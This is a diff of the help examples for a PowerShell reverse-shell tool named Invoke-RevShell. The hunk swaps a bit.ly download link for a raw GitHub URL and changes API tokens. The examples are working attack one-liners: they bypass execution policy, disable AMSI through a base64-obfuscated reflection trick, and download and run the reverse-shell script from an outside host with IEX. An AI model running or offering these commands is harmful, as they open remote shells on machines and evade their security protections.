@@ -13,18 +13,18 @@ function Invoke-RevShell {
 
     .EXAMPLE
     C:\PS> Import-Module .\Invoke-RevShell
-    C:\PS> Invoke-RevShell -api 29yl5EiFZzgT0Atb31Gi15TERuT_6SRPezQnv1kT2WLo5b1Mr
+    C:\PS> Invoke-RevShell -api 29yvUB6uwEHpE8lhStj4qIdwZ2e_7Tq9NtyNJJ6vcpYPq6mhJ
     
     .EXAMPLE
     powershell -ep Bypass -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
-                                IEX(New-Object Net.WebClient).downloadString('https://bit.ly/3N8EZjb'); 
-                                Invoke-RevShell -api 29yl5EiFZzgT0Atb31Gi15TERuT_6SRPezQnv1kT2WLo5b1Mr;"
+                                IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/halitAKAYDIN/Ps-Revshell/main/Invoke-RevShell.ps1'); 
+                                Invoke-RevShell -api 29yvUB6uwEHpE8lhStj4qIdwZ2e_7Tq9NtyNJJ6vcpYPq6mhJ;"
 
     .EXAMPLE
     [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true);
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls;
     IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/halitAKAYDIN/Ps-Revshell/main/Invoke-RevShell.ps1'); 
-    Invoke-RevShell -api 29yq9XSYB6rbCwWUVZJENMjGFmG_tVLYBw5qyLRfqMVxDe5M;
+    Invoke-RevShell -api 29yvUB6uwEHpE8lhStj4qIdwZ2e_7Tq9NtyNJJ6vcpYPq6mhJ;
     #>
 
     param(
